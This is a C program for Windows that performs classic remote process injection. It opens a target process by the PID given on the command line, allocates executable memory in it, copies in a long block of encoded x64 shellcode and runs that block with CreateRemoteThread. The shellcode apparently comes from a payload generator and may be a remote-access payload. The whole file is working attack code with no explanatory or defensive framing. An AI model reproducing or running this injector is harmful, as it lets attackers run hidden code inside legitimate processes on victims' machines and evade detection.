#include "Windows.h"
#include <stdio.h>

int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\xbe\xd7\xc7\xae\x05\x5e\x22\x2b\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x42\x9f\x44"
		"\x4a\xf5\xb6\xe2\x2b\xbe\xd7\x86\xff\x44\x0e\x70\x7a\xe8"
		"\x9f\xf6\x7c\x60\x16\xa9\x79\xde\x9f\x4c\xfc\x1d\x16\xa9"
		"\x79\x9e\x9f\x4c\xdc\x55\x16\x2d\x9c\xf4\x9d\x8a\x9f\xcc"
		"\x16\x13\xeb\x12\xeb\xa6\xd2\x07\x72\x02\x6a\x7f\x1e\xca"
		"\xef\x04\x9f\xc0\xc6\xec\x96\x96\xe6\x8e\x0c\x02\xa0\xfc"
		"\xeb\x8f\xaf\xd5\xd5\xa2\xa3\xbe\xd7\xc7\xe6\x80\x9e\x56"
		"\x4c\xf6\xd6\x17\xfe\x8e\x16\x3a\x6f\x35\x97\xe7\xe7\x04"
		"\x8e\xc1\x7d\xf6\x28\x0e\xef\x8e\x6a\xaa\x63\xbf\x01\x8a"
		"\x9f\xcc\x16\x13\xeb\x12\x96\x06\x67\x08\x1f\x23\xea\x86"
		"\x37\xb2\x5f\x49\x5d\x6e\x0f\xb6\x92\xfe\x7f\x70\x86\x7a"
		"\x6f\x35\x97\xe3\xe7\x04\x8e\x44\x6a\x35\xdb\x8f\xea\x8e"
		"\x1e\x3e\x62\xbf\x07\x86\x25\x01\xd6\x6a\x2a\x6e\x96\x9f"
		"\xef\x5d\x00\x7b\x71\xff\x8f\x86\xf7\x44\x04\x6a\xa8\x52"
		"\xf7\x86\xfc\xfa\xbe\x7a\x6a\xe7\x8d\x8f\x25\x17\xb7\x75"
		"\xd4\x41\x28\x9a\xe7\xbb\x29\x51\x19\xe1\xe4\xf5\xae\x05"
		"\x1f\x74\x62\x37\x31\x8f\x2f\xe9\xfe\x23\x2b\xbe\x9e\x4e"
		"\x4b\x4c\xe2\x20\x2b\xbf\x6c\x07\x06\x04\xa0\x63\x7f\xf7"
		"\x5e\x23\xe2\x8c\xaf\x63\x91\xf2\xa0\xe1\xa9\xfa\x8b\x6e"
		"\xa2\x54\xbf\xc6\xaf\x05\x5e\x7b\x6a\x04\xfe\x47\xc5\x05"
		"\xa1\xf7\x7b\xee\x9a\xf6\x67\x48\x6f\xe2\x63\x41\x17\x8f"
		"\x27\xc7\x16\xdd\xeb\xf6\x5e\x06\xef\xbf\xb4\x2d\xf4\x5e"
		"\x28\x12\xe6\x8c\x99\x48\x3b\xff\x8f\x8b\x27\xe7\x16\xab"
		"\xd2\xff\x6d\x5e\x0b\x71\x3f\xdd\xfe\xf6\x56\x03\xee\x07"
		"\x5e\x22\x62\x06\xb4\xaa\xca\x05\x5e\x22\x2b\xbe\x96\x97"
		"\xef\x55\x16\xab\xc9\xe9\x80\x90\xe3\x34\x9e\x48\x26\xe7"
		"\x96\x97\x4c\xf9\x38\xe5\x6f\x9a\x83\xc6\xaf\x4d\xd3\x66"
		"\x0f\xa6\x11\xc7\xc6\x4d\xd7\xc4\x7d\xee\x96\x97\xef\x55"
		"\x1f\x72\x62\x41\x17\x86\xfe\x4c\xa1\xea\x66\x37\x16\x8b"
		"\x27\xc4\x1f\x98\x52\x72\xe8\x41\x51\xd0\x16\x13\xf9\xf6"
		"\x28\x0d\x25\x0b\x1f\x98\x23\x39\xca\xa7\x51\xd0\xe5\xd2"
		"\x9e\x1c\x81\x86\x14\xa3\xcb\x9f\xb6\x41\x02\x8f\x2d\xc1"
		"\x76\x1e\x2d\xc2\xdd\x47\x55\xe5\x2b\x27\x90\xf9\xc4\xb5"
		"\xc1\x6f\x5e\x7b\x6a\x37\x0d\x38\x7b\x05\x5e\x22\x2b";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}